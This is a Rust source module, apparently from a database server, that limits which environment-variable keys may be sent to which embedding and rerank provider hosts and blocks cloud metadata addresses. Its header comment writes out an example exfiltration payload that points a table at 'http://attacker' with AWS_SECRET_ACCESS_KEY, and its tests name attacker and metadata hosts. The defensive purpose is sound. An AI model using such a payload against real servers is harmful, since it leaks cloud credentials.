//! Which secret may go to which provider.
//!
//! A table names its embedding and rerank providers -- a `base_url` and the *name* of an
//! environment variable holding the key -- and those come off the wire, from whoever can
//! create or alter a table. With no rule here that was a way to read the server's environment:
//! `{"base_url": "http://attacker", "api_key_env": "AWS_SECRET_ACCESS_KEY"}` and one insert,
//! and the server sent the secret as a bearer token to the attacker. The server has no
//! authentication by default, so that was anyone who could reach the port.
//!
//! The rule is applied where the key is read and the request is made, not where a table is
//! created, so it holds for every path that reaches a provider: create, alter, WAL replay, an
//! imported table, a restored backup.
//!
//! - **The variable must be one meant to hold a provider key**: a well-known provider's
//!   (`OPENAI_API_KEY`, ...), the one the operator named in `DXMT_EMBEDDING_API_KEY_ENV`, or
//!   one listed in `DXMT_ALLOWED_KEY_ENVS`. `DXMT_API_KEY` -- this server's own -- never is.
//! - **A key goes only to a host meant to receive it**: a well-known provider's API host,
//!   this machine, the host of `DXMT_EMBEDDING_BASE_URL`, or one listed in
//!   `DXMT_ALLOWED_PROVIDER_HOSTS`.
//! - **No provider URL may point at link-local addresses** (`169.254.0.0/16`, `fe80::/10`) or
//!   a cloud metadata name, key or no key: that is where cloud credentials are served.
//!
//! A variable that is unset or empty sends no key, so a local provider that needs none (ollama,
//! text-embeddings-inference) is unaffected by the first two rules.

use crate::{Error, Result};

/// Provider-key variables allowed without configuration.
const KNOWN_KEY_ENVS: &[&str] = &[
    "OPENAI_API_KEY",
    "DXMT_EMBEDDING_API_KEY",
    "RERANK_API_KEY",
    "COHERE_API_KEY",
    "CO_API_KEY",
    "JINA_API_KEY",
    "VOYAGE_API_KEY",
    "MISTRAL_API_KEY",
    "DEEPINFRA_API_KEY",
    "TOGETHER_API_KEY",
    "SILICONFLOW_API_KEY",
    "DASHSCOPE_API_KEY",
];

/// API hosts of those providers.
const KNOWN_PROVIDER_HOSTS: &[&str] = &[
    "api.openai.com",
    "api.cohere.com",
    "api.cohere.ai",
    "api.jina.ai",
    "api.voyageai.com",
    "api.mistral.ai",
    "api.deepinfra.com",
    "api.together.xyz",
    "api.siliconflow.cn",
    "dashscope.aliyuncs.com",
];

fn listed(var: &str) -> Vec<String> {
    crate::config::env::var(var)
        .map(|v| {
            v.split(',')
                .map(|s| s.trim().to_ascii_lowercase())
                .filter(|s| !s.is_empty())
                .collect()
        })
        .unwrap_or_default()
}

fn key_env_allowed(name: &str) -> bool {
    if name == "DXMT_API_KEY" {
        return false;
    }
    KNOWN_KEY_ENVS.contains(&name)
        || crate::config::env::var("DXMT_EMBEDDING_API_KEY_ENV").is_ok_and(|v| v.trim() == name)
        || listed("DXMT_ALLOWED_KEY_ENVS")
            .iter()
            .any(|n| n.eq_ignore_ascii_case(name))
}

fn is_loopback(host: &str) -> bool {
    host == "localhost"
        || host
            .trim_matches(|c| c == '[' || c == ']')
            .parse::<std::net::IpAddr>()
            .is_ok_and(|ip| ip.is_loopback())
}

fn is_link_local_or_metadata(host: &str) -> bool {
    let bare = host.trim_matches(|c| c == '[' || c == ']');
    match bare.parse::<std::net::IpAddr>() {
        Ok(std::net::IpAddr::V4(v4)) => v4.is_link_local(),
        Ok(std::net::IpAddr::V6(v6)) => {
            (v6.segments()[0] & 0xffc0) == 0xfe80
                || v6.to_ipv4_mapped().is_some_and(|v4| v4.is_link_local())
        }
        Err(_) => matches!(bare, "metadata" | "metadata.google.internal"),
    }
}

fn host_allowed_for_key(host: &str) -> bool {
    is_loopback(host)
        || KNOWN_PROVIDER_HOSTS.contains(&host)
        || crate::config::env::var("DXMT_EMBEDDING_BASE_URL")
            .ok()
            .and_then(|u| reqwest::Url::parse(u.trim()).ok())
            .and_then(|u| u.host_str().map(str::to_ascii_lowercase))
            .is_some_and(|h| h == host)
        || listed("DXMT_ALLOWED_PROVIDER_HOSTS")
            .iter()
            .any(|h| h == host)
}

/// The key to send with a request to `url`, after the rules above; `None` when the variable is
/// unset or empty. An error names the rule and the setting that would allow it.
pub fn provider_key(key_env: &str, url: &str) -> Result<Option<String>> {
    let parsed = reqwest::Url::parse(url)
        .map_err(|e| Error::InvalidConfig(format!("provider URL '{url}' is not a URL: {e}")))?;
    if !matches!(parsed.scheme(), "http" | "https") {
        return Err(Error::InvalidConfig(format!(
            "provider URL '{url}' must be http or https"
        )));
    }
    let host = parsed
        .host_str()
        .map(str::to_ascii_lowercase)
        .ok_or_else(|| Error::InvalidConfig(format!("provider URL '{url}' has no host")))?;
    if is_link_local_or_metadata(&host) {
        return Err(Error::InvalidConfig(format!(
            "provider URL '{url}' points at a link-local or cloud metadata address, which is \
             refused: that is where a cloud machine's own credentials are served"
        )));
    }
    let Some(key) = crate::config::env::var(key_env)
        .ok()
        .filter(|k| !k.is_empty())
    else {
        return Ok(None);
    };
    if !key_env_allowed(key_env) {
        return Err(Error::InvalidConfig(format!(
            "api_key_env '{key_env}' is not a provider key this server will send: name a \
             provider's own variable (OPENAI_API_KEY, COHERE_API_KEY, ...), or list it in \
             DXMT_ALLOWED_KEY_ENVS. A table's settings come from its callers, and any variable \
             of the server's environment could otherwise be sent to any URL"
        )));
    }
    if !host_allowed_for_key(&host) {
        return Err(Error::InvalidConfig(format!(
            "will not send {key_env} to '{host}': a provider key goes only to a known provider, \
             this machine, the host of DXMT_EMBEDDING_BASE_URL, or a host listed in \
             DXMT_ALLOWED_PROVIDER_HOSTS. A provider that needs no key can be given an \
             api_key_env that is unset"
        )));
    }
    Ok(Some(key))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_server_s_own_key_and_arbitrary_variables_are_never_provider_keys() {
        assert!(!key_env_allowed("DXMT_API_KEY"));
        assert!(!key_env_allowed("AWS_SECRET_ACCESS_KEY"));
        assert!(!key_env_allowed("PATH"));
        assert!(key_env_allowed("OPENAI_API_KEY"));
        assert!(key_env_allowed("RERANK_API_KEY"));
    }

    #[test]
    fn hosts() {
        assert!(is_loopback("localhost") && is_loopback("127.0.0.1") && is_loopback("[::1]"));
        assert!(!is_loopback("10.0.0.5"));
        for h in [
            "169.254.169.254",
            "[fe80::1]",
            "metadata.google.internal",
            "[::ffff:169.254.169.254]",
        ] {
            assert!(is_link_local_or_metadata(h), "{h}");
        }
        assert!(!is_link_local_or_metadata("10.0.0.5"));
        assert!(host_allowed_for_key("api.openai.com"));
        assert!(!host_allowed_for_key("attacker.example"));
    }

    #[test]
    fn a_metadata_url_is_refused_with_or_without_a_key() {
        let err =
            provider_key("DXMT_POLICY_TEST_UNSET", "http://169.254.169.254/latest").unwrap_err();
        assert!(err.to_string().contains("metadata"), "{err}");
        assert!(provider_key("DXMT_POLICY_TEST_UNSET", "ftp://x/v1").is_err());
        assert_eq!(
            provider_key("DXMT_POLICY_TEST_UNSET", "http://10.0.0.5:11434/v1").unwrap(),
            None,
            "no key, an ordinary host: allowed, nothing sent"
        );
    }
}
